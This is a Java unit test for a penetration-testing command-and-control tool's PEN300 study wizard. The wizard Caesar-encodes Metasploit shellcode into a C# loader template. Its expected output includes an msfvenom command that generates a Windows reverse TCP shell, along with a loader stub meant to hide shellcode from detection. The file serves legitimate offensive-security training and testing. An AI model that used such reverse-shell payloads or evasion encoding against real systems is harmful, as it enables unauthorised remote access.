package c2.session.wizard;

import static org.junit.jupiter.api.Assertions.*;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.nio.file.Paths;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.junit.jupiter.api.Test;

import c2.admin.LocalConnection;
import c2.session.CommandMacroManager;
import c2.session.CommandWizard;
import c2.session.IOManager;
import c2.session.SecureSessionInitiator;
import c2.session.SessionManager;
import c2.session.log.IOLogger;
import util.test.ClientServerTest;

class PEN300StudyToolsWizardTest {

	@Test
	void testSelectsMsfWithNameErrorChecking() {
		try {
			ByteArrayOutputStream cmdBuffer = new ByteArrayOutputStream();
			BufferedOutputStream bos = new BufferedOutputStream(cmdBuffer);
			PrintWriter builder = new PrintWriter(bos);
			builder.println("WIZARD");
			builder.println(Pen300TestToolsWizard.INVOKE_COMMAND);
			builder.println("Nonsense Wizard");
			builder.println(MsfShellcodeCaesarWizard.INVOKE_COMMAND);
			builder.println("1");// Try to generate a command before setting Caesar to get error
			builder.println("set_caesar");
			builder.println("set_caesar=gary");
			builder.println("set_caesar=4");
			builder.println("1");// Try to generate a command before setting LPORT/LHOST
			builder.println("set_lport=8003");
			builder.println("powershell -c \"Get-Content -Path "
					+ MsfShellcodeCaesarWizardTest.TEST_DATA_FILE.toAbsolutePath().toString() + "\"");// Pull a fake
																										// shell from
																										// the test data
																										// directory
			builder.println("17");// Non-sense payload file ID
			builder.println("gary");
			builder.println("0");// Correct C# stand-in
			builder.println(CommandWizard.CMD_QUIT);// Quit out of Pen300 wizard
			builder.println(CommandWizard.CMD_QUIT);// Quit main command wizard
			builder.println("sleep");
			builder.println(LocalConnection.CMD_QUIT_LOCAL);
			builder.flush();
			builder.close();
			BufferedReader br = new BufferedReader(
					new InputStreamReader(new ByteArrayInputStream(cmdBuffer.toByteArray())));

			// Prepare stream to receive output
			ByteArrayOutputStream receiveCmdBuffer = new ByteArrayOutputStream();
			PrintStream ps = new PrintStream(receiveCmdBuffer);

			// Set up server elements
			IOManager io = new IOManager(new IOLogger(Paths.get("test")), null);
			Random random = new Random();
			int port = 40000 + random.nextInt(1000);
			CommandMacroManager cmm = new CommandMacroManager(null, io, null);
			List<Wizard> wizards = Wizard.initializeWizards(ClientServerTest.getDefaultSystemTestProperties());
			SessionManager manager = new SessionManager(io, port + 1, port, cmm,
					ClientServerTest.getDefaultSystemTestProperties(), wizards);
			SecureSessionInitiator testSession = new SecureSessionInitiator(manager, io, port, cmm,
					ClientServerTest.getDefaultSystemTestProperties(), wizards);
			ExecutorService service = Executors.newFixedThreadPool(4);
			service.submit(testSession);

			LocalConnection lc = new LocalConnection();
			String args[] = { "127.0.0.1", port + "" };
			try {
				lc.engage(args, br, ps, ClientServerTest.getDefaultSystemTestProperties());
			} catch (Exception ex) {
				ex.printStackTrace();
				fail(ex.getMessage());
			}

			// Read back the stream through the client
			br = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(receiveCmdBuffer.toByteArray())));
			// Iterate over lines and validate

			br.readLine();// Available sessions
			br.readLine();// Default session
			String line = br.readLine();
			assertEquals("Enter 'WIZARD' to begin other server commands", line);
			line = br.readLine();
			assertEquals("Available commands: ", line);
			br.readLine();// Option line
			br.readLine();// Command line
			br.readLine();// Example line
			br.readLine();// Command line
			br.readLine();// Example line
			line = br.readLine();
			assertEquals("Note: Only available with TheAllCommander on Windows", line);
			assertEquals("generate_java - Java Staged Payload Wizard", br.readLine());
			assertEquals("study_pen300 - PEN300 Study Support Tools", br.readLine());
			line = br.readLine();
			assertEquals(CommandWizard.CMD_QUIT, line);
			assertEquals(
					"Welcome to the PEN300 study wizard, which automates a some tool generations and configuration. Please select one of the available tool wizards, or 'quit' to return.",
					br.readLine());
			assertEquals("caesar_msf_helper - MSF Shellcode Caesar Helper", br.readLine());
			assertEquals("I'm sorry, I didn't understand that.", br.readLine());
			assertEquals(
					"Welcome to the PEN300 study wizard, which automates a some tool generations and configuration. Please select one of the available tool wizards, or 'quit' to return.",
					br.readLine());
			assertEquals("caesar_msf_helper - MSF Shellcode Caesar Helper", br.readLine());
			assertEquals("PEN300 Helper Module: MSF Shellcode Caesar Encoder", br.readLine());
			assertEquals(
					"Enter a Caesar cipher factor with the command such as 'set_caesar=4'. A positive value of 4 will increment all bytes by 4",
					br.readLine());
			assertEquals(
					"Enter a number corresponding to one of the predefined MSF shellcodes commands below, or enter a custom MSF shellcode.",
					br.readLine());
			assertEquals(
					"If using a predefined command, please first set LHOST and LPORT with the commands 'set_lport=127.0.0.1' and set 'set_lport=8080'",
					br.readLine());
			assertEquals("(0) msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f csharp",
					br.readLine());
			assertEquals("Finally, selected from one of the available payload files", br.readLine());
			assertEquals("(0) config\\pen300_study_tools\\msf_templates\\fake_program.cs", br.readLine());
			assertEquals("", br.readLine());
			assertEquals("Please set caesar before continuing", br.readLine());
			assertEquals("Invalid format for set_caesar", br.readLine());
			assertEquals("set_caesar must specify a number", br.readLine());
			assertEquals("Please set lhost and lport before continuing", br.readLine());
			assertEquals("Please select from one of the following available file templates:", br.readLine());
			assertEquals("(0) config\\pen300_study_tools\\msf_templates\\fake_program.cs", br.readLine());
			assertEquals("Invalid choice for file template", br.readLine());
			assertEquals("Pick a number to select file template", br.readLine());
			assertEquals("using System;", br.readLine());
			assertEquals("", br.readLine());
			assertEquals("namespace C2", br.readLine());
			assertEquals("{", br.readLine());
			assertEquals("    class HTTPS_Daemon: Client", br.readLine());
			assertEquals("    {", br.readLine());
			assertEquals("	public static void Main(string[] args) ", br.readLine());
			assertEquals("        {", br.readLine());
			assertTrue(br.readLine().startsWith("		byte[] mah_payload = "));
			assertEquals("	}", br.readLine());
			assertEquals("    }", br.readLine());
			assertEquals("}", br.readLine());
			assertEquals("", br.readLine());
		} catch (IOException ex) {
			fail(ex.getMessage());
		}
	}

}
